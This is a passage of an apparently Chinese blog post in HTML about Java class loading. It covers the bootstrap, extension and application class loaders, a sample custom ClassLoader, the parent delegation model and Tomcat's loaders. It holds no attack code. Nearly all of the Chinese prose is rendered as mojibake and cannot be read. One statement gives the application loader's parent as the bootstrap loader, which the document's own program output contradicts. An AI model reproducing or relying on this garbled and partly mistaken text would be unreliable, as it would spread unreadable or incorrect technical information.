class="line">    this.hash = original.hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–æ—¶æœºåŒ…æ‹¬ä»¥ä¸‹è¿™äº›ï¼š</p><ul><li>åˆ›å»ºç±»çš„å®ä¾‹æ—¶ã€‚</li><li>è®¿é—®ç±»çš„é™æ€æ–¹æ³•æˆ–é™æ€å­—æ®µæ—¶ï¼ˆé™¤äº† final å¸¸é‡ï¼Œå®ƒä»¬åœ¨ç¼–è¯‘æœŸå°±å·²ç»æ”¾å…¥å¸¸é‡æ± ï¼‰ã€‚</li><li>ä½¿ç”¨ java.lang.reflect åŒ…çš„æ–¹æ³•å¯¹ç±»è¿›è¡Œåå°„è°ƒç”¨æ—¶ã€‚</li><li>åˆå§‹åŒ–ä¸€ä¸ªç±»çš„å­ç±»ï¼ˆé¦–å…ˆä¼šåˆå§‹åŒ–çˆ¶ç±»ï¼‰ã€‚</li><li>JVM å¯åŠ¨æ—¶ï¼Œç”¨æˆ·æŒ‡å®šçš„ä¸»ç±»ï¼ˆåŒ…å« main æ–¹æ³•çš„ç±»ï¼‰å°†è¢«åˆå§‹åŒ–ã€‚</li></ul><h4 id="ç±»åŠ è½½å™¨åˆ†ç±»"><a href="#ç±»åŠ è½½å™¨åˆ†ç±»" class="headerlink" title="ç±»åŠ è½½å™¨åˆ†ç±»"></a>ç±»åŠ è½½å™¨åˆ†ç±»</h4><p>è¯´å®Œäº†ç±»åŠ è½½å™¨æœºåˆ¶å°±è¦è¯´åˆ°åˆ†ç±»äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742522688330-186bb80e-e7e5-4b36-a7bc-3979e490747f.png"></p><p>è‡ªåº•å‘ä¸ŠæŸ¥æ‰¾åˆ¤æ–­ç±»æ˜¯å¦è¢«åŠ è½½ï¼Œè‡ªé¡¶å‘ä¸‹å°è¯•åŠ è½½ç±»</p><p>åœ¨ä»‹ç»ä¹‹å‰å…ˆæ¥ä¸ªä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ClassLoader loader = Main.class.getClassLoader();</span><br><span class="line">        while (loader != null) &#123;</span><br><span class="line">            System.out.println(loader);</span><br><span class="line">            loader = loader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/bin/java -javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=59283:/Applications/IntelliJ IDEA.app/Contents/bin -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/cldrdata.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/jaccess.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/nashorn.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jfxswt.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/rt.jar:/Users/apple/Documents/javacode/classloader/target/classes org.example.Main</span><br><span class="line">sun.misc.Launcher$AppClassLoader@5ce65a89</span><br><span class="line">sun.misc.Launcher$ExtClassLoader@1edf1c96</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°BootstrapClassLoaderè·å–åˆ°æ˜¯nullï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸º<code>BootstrapClassLoader</code> ç”± C++ å®ç°ï¼Œç”±äºè¿™ä¸ª C++ å®ç°çš„ç±»åŠ è½½å™¨åœ¨ Java ä¸­æ˜¯æ²¡æœ‰ä¸ä¹‹å¯¹åº”çš„ç±»çš„ï¼Œæ‰€ä»¥æ‹¿åˆ°çš„ç»“æœæ˜¯ nullã€‚</p><ul><li><strong>ç¬¬ä¸€ä¸ªï¼šå¯åŠ¨ç±»&#x2F;å¼•å¯¼ç±»ï¼šBootstrap ClassLoader</strong></li></ul><p>è¿™ä¸ªç±»åŠ è½½å™¨ä½¿ç”¨C&#x2F;C++è¯­è¨€å®ç°çš„ï¼ŒåµŒå¥—åœ¨JVMå†…éƒ¨ï¼Œjavaç¨‹åºæ— æ³•ç›´æ¥æ“ä½œè¿™ä¸ªç±»ã€‚</p><p>å®ƒç”¨æ¥åŠ è½½Javaæ ¸å¿ƒç±»åº“ï¼Œå¦‚ï¼š<code>JAVA_HOME/jre/lib/rt.jar</code>ã€<code>resources.jar</code>ã€<code>sun.boot.class.path</code>è·¯å¾„ä¸‹çš„åŒ…ï¼Œç”¨äºæä¾›jvmè¿è¡Œæ‰€éœ€çš„åŒ…ã€‚</p><p>å¹¶ä¸æ˜¯ç»§æ‰¿è‡ªjava.lang.ClassLoaderï¼Œå®ƒæ²¡æœ‰çˆ¶ç±»åŠ è½½å™¨</p><p>å®ƒåŠ è½½<code>æ‰©å±•ç±»åŠ è½½å™¨</code>å’Œ<code>åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨</code>ï¼Œå¹¶æˆä¸ºä»–ä»¬çš„çˆ¶ç±»åŠ è½½å™¨</p><p>å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå¯åŠ¨ç±»åªåŠ è½½åŒ…åä¸ºï¼šjavaã€javaxã€sunå¼€å¤´çš„ç±»</p><ul><li><strong>ç¬¬äºŒä¸ªï¼šæ‰©å±•ç±»åŠ è½½å™¨ï¼šExtension ClassLoader</strong></li></ul><p>Javaè¯­è¨€ç¼–å†™ï¼Œç”±<code>sun.misc.Launcher$ExtClassLoader</code>å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Javaç¨‹åºæ“ä½œè¿™ä¸ªåŠ è½½å™¨</p><p>æ´¾ç”Ÿç»§æ‰¿è‡ªjava.lang.ClassLoaderï¼Œçˆ¶ç±»åŠ è½½å™¨ä¸º<code>å¯åŠ¨ç±»åŠ è½½å™¨</code></p><p>ä»ç³»ç»Ÿå±æ€§ï¼š<code>java.ext.dirs</code>ç›®å½•ä¸­åŠ è½½ç±»åº“ï¼Œæˆ–è€…ä»JDKå®‰è£…ç›®å½•ï¼š<code>jre/lib/ext</code>ç›®å½•ä¸‹åŠ è½½ç±»åº“ã€‚æˆ‘ä»¬å°±å¯ä»¥å°†æˆ‘ä»¬è‡ªå·±çš„åŒ…æ”¾åœ¨ä»¥ä¸Šç›®å½•ä¸‹ï¼Œå°±ä¼šè‡ªåŠ¨åŠ è½½è¿›æ¥äº†ã€‚</p><ul><li><strong>ç¬¬ä¸‰ä¸ªï¼šåº”ç”¨ç¨‹åºç±»åŠ è½½å™¨ï¼šApplication Classloader</strong></li></ul><p>Javaè¯­è¨€ç¼–å†™ï¼Œç”±<code>sun.misc.Launcher$AppClassLoader</code>å®ç°ã€‚</p><p>æ´¾ç”Ÿç»§æ‰¿è‡ªjava.lang.ClassLoaderï¼Œçˆ¶ç±»åŠ è½½å™¨ä¸º<code>å¯åŠ¨ç±»åŠ è½½å™¨</code></p><p>å®ƒè´Ÿè´£åŠ è½½<code>ç¯å¢ƒå˜é‡classpath</code>æˆ–è€…<code>ç³»ç»Ÿå±æ€§java.class.path</code>æŒ‡å®šè·¯å¾„ä¸‹çš„ç±»åº“</p><p>å®ƒæ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œæˆ‘ä»¬Javaç¨‹åºä¸­çš„ç±»ï¼Œéƒ½æ˜¯ç”±å®ƒåŠ è½½å®Œæˆçš„ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>ClassLoader#getSystemClassLoader()</code>è·å–å¹¶æ“ä½œè¿™ä¸ªåŠ è½½å™¨</p><ul><li><strong>ç¬¬å››ä¸ªï¼šè‡ªå®šä¹‰åŠ è½½å™¨</strong></li></ul><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä»¥ä¸Š3ç§åŠ è½½å™¨èƒ½æ»¡è¶³æˆ‘ä»¬æ—¥å¸¸çš„å¼€å‘å·¥ä½œï¼Œä¸æ»¡è¶³æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥<code>è‡ªå®šä¹‰åŠ è½½å™¨</code></p><p>æ¯”å¦‚ç”¨ç½‘ç»œåŠ è½½Javaç±»ï¼Œä¸ºäº†ä¿è¯ä¼ è¾“ä¸­çš„å®‰å…¨æ€§ï¼Œé‡‡ç”¨äº†åŠ å¯†æ“ä½œï¼Œé‚£ä¹ˆä»¥ä¸Š3ç§åŠ è½½å™¨å°±æ— æ³•åŠ è½½è¿™ä¸ªç±»ï¼Œè¿™æ—¶å€™å°±éœ€è¦<code>è‡ªå®šä¹‰åŠ è½½å™¨</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class CustomClassLoader extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">    private String pathToBin;</span><br><span class="line"></span><br><span class="line">    public CustomClassLoader(String pathToBin) &#123;</span><br><span class="line">        this.pathToBin = pathToBin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classData = loadClassData(name);</span><br><span class="line">            return defineClass(name, classData, 0, classData.length);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new ClassNotFoundException(&quot;Class &quot; + name + &quot; not found&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private byte[] loadClassData(String name) throws IOException &#123;</span><br><span class="line">        String file = pathToBin + name.replace(&#x27;.&#x27;, File.separatorChar) + &quot;.class&quot;;</span><br><span class="line">        InputStream is = new FileInputStream(file);</span><br><span class="line">        ByteArrayOutputStream byteSt = new ByteArrayOutputStream();</span><br><span class="line">        int len = 0;</span><br><span class="line">        while ((len = is.read()) != -1) &#123;</span><br><span class="line">            byteSt.write(len);</span><br><span class="line">        &#125;</span><br><span class="line">        return byteSt.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè‡ªå®šä¹‰ç±»åŠ è½½å™¨åšäº†ä»¥ä¸‹å‡ ä»¶äº‹æƒ…ï¼š</p><ul><li>æ„é€ å™¨ï¼šæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æŒ‡å®šäº†ç±»æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„ã€‚</li><li>è¦†å†™ findClass æ–¹æ³•ï¼šå½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•åŠ è½½ç±»æ—¶ï¼ŒfindClass æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ loadClassData æ–¹æ³•è¯»å–ç±»æ–‡ä»¶çš„å­—èŠ‚ç ï¼Œç„¶åè°ƒç”¨ defineClass æ–¹æ³•æ¥å°†è¿™äº›å­—èŠ‚ç è½¬æ¢ä¸º Class å¯¹è±¡ã€‚</li><li>loadClassData æ–¹æ³•ï¼šè¯»å–æŒ‡å®šè·¯å¾„ä¸‹çš„ç±»æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å†…å®¹ä½œä¸ºå­—èŠ‚æ•°ç»„è¿”å›ã€‚</li></ul><h5 id="è·å–ClassLoaderçš„å‡ ç§æ–¹å¼"><a href="#è·å–ClassLoaderçš„å‡ ç§æ–¹å¼" class="headerlink" title="è·å–ClassLoaderçš„å‡ ç§æ–¹å¼"></a>è·å–ClassLoaderçš„å‡ ç§æ–¹å¼</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// æ–¹å¼ä¸€ï¼šè·å–å½“å‰ç±»çš„ ClassLoader</span><br><span class="line">clazz.getClassLoader()</span><br><span class="line">// æ–¹å¼äºŒï¼šè·å–å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡çš„ ClassLoader</span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line">// æ–¹å¼ä¸‰ï¼šè·å–ç³»ç»Ÿçš„ ClassLoader</span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line">// æ–¹å¼å››ï¼šè·å–è°ƒç”¨è€…çš„ ClassLoader</span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h5 id="åŒäº²å§”æ´¾"><a href="#åŒäº²å§”æ´¾" class="headerlink" title="åŒäº²å§”æ´¾"></a>åŒäº²å§”æ´¾</h5><h5 id="åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParent-Delegation-Modelï¼‰æ˜¯-Java-ç±»åŠ è½½å™¨ä½¿ç”¨çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºç¡®ä¿-Java-ç¨‹åºçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œç±»åŠ è½½å™¨åœ¨å°è¯•åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œé¦–å…ˆä¼šå§”æ´¾ç»™å…¶çˆ¶åŠ è½½å™¨å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œåªæœ‰åœ¨çˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚"><a href="#åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParent-Delegation-Modelï¼‰æ˜¯-Java-ç±»åŠ è½½å™¨ä½¿ç”¨çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºç¡®ä¿-Java-ç¨‹åºçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œç±»åŠ è½½å™¨åœ¨å°è¯•åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œé¦–å…ˆä¼šå§”æ´¾ç»™å…¶çˆ¶åŠ è½½å™¨å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œåªæœ‰åœ¨çˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParent Delegation Modelï¼‰æ˜¯ Java ç±»åŠ è½½å™¨ä½¿ç”¨çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºç¡®ä¿ Java ç¨‹åºçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œç±»åŠ è½½å™¨åœ¨å°è¯•åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œé¦–å…ˆä¼šå§”æ´¾ç»™å…¶çˆ¶åŠ è½½å™¨å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œåªæœ‰åœ¨çˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚"></a>åŒäº²å§”æ´¾æ¨¡å‹ï¼ˆParent Delegation Modelï¼‰æ˜¯ Java ç±»åŠ è½½å™¨ä½¿ç”¨çš„ä¸€ç§æœºåˆ¶ï¼Œç”¨äºç¡®ä¿ Java ç¨‹åºçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œç±»åŠ è½½å™¨åœ¨å°è¯•åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œé¦–å…ˆä¼šå§”æ´¾ç»™å…¶çˆ¶åŠ è½½å™¨å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œåªæœ‰åœ¨çˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½è¯¥ç±»æ—¶ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚</h5><ol><li><strong>å§”æ´¾ç»™çˆ¶åŠ è½½å™¨</strong>ï¼šå½“ä¸€ä¸ªç±»åŠ è½½å™¨æ¥æ”¶åˆ°ç±»åŠ è½½çš„è¯·æ±‚æ—¶ï¼Œå®ƒé¦–å…ˆä¸ä¼šå°è¯•è‡ªå·±å»åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯å°†è¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™å®ƒçš„çˆ¶åŠ è½½å™¨ã€‚</li><li><strong>é€’å½’å§”æ´¾</strong>ï¼šè¿™ä¸ªè¿‡ç¨‹ä¼šé€’å½’å‘ä¸Šè¿›è¡Œï¼Œä»å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap ClassLoaderï¼‰å¼€å§‹ï¼Œå†åˆ°æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtension ClassLoaderï¼‰ï¼Œæœ€ååˆ°ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystem ClassLoaderï¼‰ã€‚</li><li><strong>åŠ è½½ç±»</strong>ï¼šå¦‚æœçˆ¶åŠ è½½å™¨å¯ä»¥åŠ è½½è¿™ä¸ªç±»ï¼Œé‚£ä¹ˆå°±ä½¿ç”¨çˆ¶åŠ è½½å™¨çš„ç»“æœã€‚å¦‚æœçˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½è¿™ä¸ªç±»ï¼ˆå®ƒæ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªç±»ï¼‰ï¼Œå­åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½ã€‚</li><li><strong>å®‰å…¨æ€§å’Œé¿å…é‡å¤åŠ è½½</strong>ï¼šè¿™ç§æœºåˆ¶å¯ä»¥ç¡®ä¿ä¸ä¼šé‡å¤åŠ è½½ç±»ï¼Œå¹¶ä¿æŠ¤ Java æ ¸å¿ƒ API çš„ç±»ä¸è¢«æ¶æ„æ›¿æ¢ã€‚</li></ol><p>JVM åŒºåˆ†ä¸åŒç±»çš„ä¾æ®æ˜¯ç±»ååŠ ä¸ŠåŠ è½½è¯¥ç±»çš„ç±»åŠ è½½å™¨ï¼Œå³ä½¿ç±»åç›¸åŒï¼Œå¦‚æœç”±ä¸åŒçš„ç±»åŠ è½½å™¨åŠ è½½ï¼Œä¹Ÿä¼šè¢«è§†ä¸ºä¸åŒçš„ç±»ã€‚ åŒäº²å§”æ´¾æ¨¡å‹ç¡®ä¿æ ¸å¿ƒç±»æ€»æ˜¯ç”± <code>BootstrapClassLoader</code> åŠ è½½ï¼Œä¿è¯äº†æ ¸å¿ƒç±»çš„å”¯ä¸€æ€§ã€‚</p><p>ä¾‹å¦‚ï¼Œå½“åº”ç”¨ç¨‹åºå°è¯•åŠ è½½ <code>java.lang.Object</code> æ—¶ï¼Œ<code>AppClassLoader</code> ä¼šé¦–å…ˆå°†è¯·æ±‚å§”æ´¾ç»™ <code>ExtClassLoader</code>ï¼Œ<code>ExtClassLoader</code> å†å§”æ´¾ç»™ <code>BootstrapClassLoader</code>ã€‚<code>BootstrapClassLoader</code> ä¼šåœ¨ JRE æ ¸å¿ƒç±»åº“ä¸­æ‰¾åˆ°å¹¶åŠ è½½ <code>java.lang.Object</code>ï¼Œä»è€Œä¿è¯åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ˜¯ JRE æä¾›çš„æ ‡å‡†ç‰ˆæœ¬ã€‚</p><p>å³ä½¿æ”»å‡»è€…ç»•è¿‡äº†åŒäº²å§”æ´¾æ¨¡å‹ï¼ŒJava ä»ç„¶å…·å¤‡æ›´åº•å±‚çš„å®‰å…¨æœºåˆ¶æ¥ä¿æŠ¤æ ¸å¿ƒç±»åº“ã€‚<code>ClassLoader</code> çš„ <code>preDefineClass</code> æ–¹æ³•ä¼šåœ¨å®šä¹‰ç±»ä¹‹å‰è¿›è¡Œç±»åæ ¡éªŒã€‚ä»»ä½•ä»¥ <code>&quot;java.&quot;</code> å¼€å¤´çš„ç±»åéƒ½ä¼šè§¦å‘ <code>SecurityException</code>ï¼Œé˜»æ­¢æ¶æ„ä»£ç å®šä¹‰æˆ–åŠ è½½ä¼ªé€ çš„æ ¸å¿ƒç±»ã€‚</p><p>ç±»åŠ è½½å™¨çš„å±‚çº§ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Bootstrap ClassLoader</span><br><span class="line">        â†‘</span><br><span class="line">        â”‚</span><br><span class="line">Extension ClassLoader</span><br><span class="line">        â†‘</span><br><span class="line">        â”‚</span><br><span class="line">System/Application ClassLoader</span><br><span class="line">        â†‘</span><br><span class="line">        â”‚</span><br><span class="line">Custom ClassLoader</span><br></pre></td></tr></table></figure><p>è¿™ç§å±‚æ¬¡å…³ç³»è¢«ç§°ä½œä¸º<strong>åŒäº²å§”æ´¾æ¨¡å‹</strong>ï¼šå¦‚æœä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†åŠ è½½ç±»çš„è¯·æ±‚ï¼Œå®ƒä¼šå…ˆæŠŠè¯·æ±‚å§”æ‰˜ç»™ä¸Šå±‚åŠ è½½å™¨å»å®Œæˆï¼Œä¸Šå±‚åŠ è½½å™¨åˆä¼šå§”æ‰˜ä¸Šä¸Šå±‚åŠ è½½å™¨ï¼Œä¸€ç›´åˆ°æœ€é¡¶å±‚çš„ç±»åŠ è½½å™¨ï¼›å¦‚æœä¸Šå±‚åŠ è½½å™¨æ— æ³•å®Œæˆç±»çš„åŠ è½½å·¥ä½œæ—¶ï¼Œå½“å‰ç±»åŠ è½½å™¨æ‰ä¼šå°è¯•è‡ªå·±å»åŠ è½½è¿™ä¸ªç±»ã€‚</p><p>è‡ªå®šä¹‰åŠ è½½å™¨çš„è¯ï¼Œéœ€è¦ç»§æ‰¿ <code>ClassLoader</code> ã€‚å¦‚æœæˆ‘ä»¬ä¸æƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹ï¼Œå°±é‡å†™ <code>ClassLoader</code> ç±»ä¸­çš„ <code>findClass()</code> æ–¹æ³•å³å¯ï¼Œæ— æ³•è¢«çˆ¶ç±»åŠ è½½å™¨åŠ è½½çš„ç±»æœ€ç»ˆä¼šé€šè¿‡è¿™ä¸ªæ–¹æ³•è¢«åŠ è½½ã€‚ä½†æ˜¯ï¼Œå¦‚æœæƒ³æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹åˆ™éœ€è¦é‡å†™ <code>loadClass()</code> æ–¹æ³•ã€‚</p><p>ä¸ºä»€ä¹ˆæ˜¯é‡å†™ <code>loadClass()</code> æ–¹æ³•æ‰“ç ´åŒäº²å§”æ´¾æ¨¡å‹å‘¢ï¼ŸåŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹å·²ç»è§£é‡Šäº†ï¼šç±»åŠ è½½å™¨åœ¨è¿›è¡Œç±»åŠ è½½çš„æ—¶å€™ï¼Œå®ƒé¦–å…ˆä¸ä¼šè‡ªå·±å»å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼ˆè°ƒç”¨çˆ¶åŠ è½½å™¨ <code>loadClass()</code>æ–¹æ³•æ¥åŠ è½½ç±»ï¼‰ã€‚é‡å†™ <code>loadClass()</code>æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å˜ä¼ ç»ŸåŒäº²å§”æ´¾æ¨¡å‹çš„æ‰§è¡Œæµç¨‹ã€‚ä¾‹å¦‚ï¼Œå­ç±»åŠ è½½å™¨å¯ä»¥åœ¨å§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨ä¹‹å‰ï¼Œå…ˆè‡ªå·±å°è¯•åŠ è½½è¿™ä¸ªç±»ï¼Œæˆ–è€…åœ¨çˆ¶ç±»åŠ è½½å™¨è¿”å›ä¹‹åï¼Œå†å°è¯•ä»å…¶ä»–åœ°æ–¹åŠ è½½è¿™ä¸ªç±»ã€‚å…·ä½“çš„è§„åˆ™ç”±æˆ‘ä»¬è‡ªå·±å®ç°ï¼Œæ ¹æ®é¡¹ç›®éœ€æ±‚å®šåˆ¶åŒ–ã€‚</p><p>æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„ Tomcat æœåŠ¡å™¨ä¸ºäº†èƒ½å¤Ÿä¼˜å…ˆåŠ è½½ Web åº”ç”¨ç›®å½•ä¸‹çš„ç±»ï¼Œç„¶åå†åŠ è½½å…¶ä»–ç›®å½•ä¸‹çš„ç±»ï¼Œå°±è‡ªå®šä¹‰äº†ç±»åŠ è½½å™¨ <code>WebAppClassLoader</code> æ¥æ‰“ç ´åŒäº²å§”æ‰˜æœºåˆ¶ã€‚è¿™ä¹Ÿæ˜¯ Tomcat ä¸‹ Web åº”ç”¨ä¹‹é—´çš„ç±»å®ç°éš”ç¦»çš„å…·ä½“åŸç†ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742533433890-a60e21dc-7eb7-4a2b-aeec-99ef60b6b3e3.png"></p><p>Tomcat è¿™å››ä¸ªè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨å¯¹åº”çš„ç›®å½•å¦‚ä¸‹ï¼š</p><ul><li><code>CommonClassLoader</code>å¯¹åº”<code>&lt;Tomcat&gt;/common/*</code></li><li><code>CatalinaClassLoader</code>å¯¹åº”<code>&lt;Tomcat &gt;/server/*</code></li><li><code>SharedClassLoader</code>å¯¹åº” <code>&lt;Tomcat &gt;/shared/*</code></li><li><code>WebAppClassloader</code>å¯¹åº” <code>&lt;Tomcat 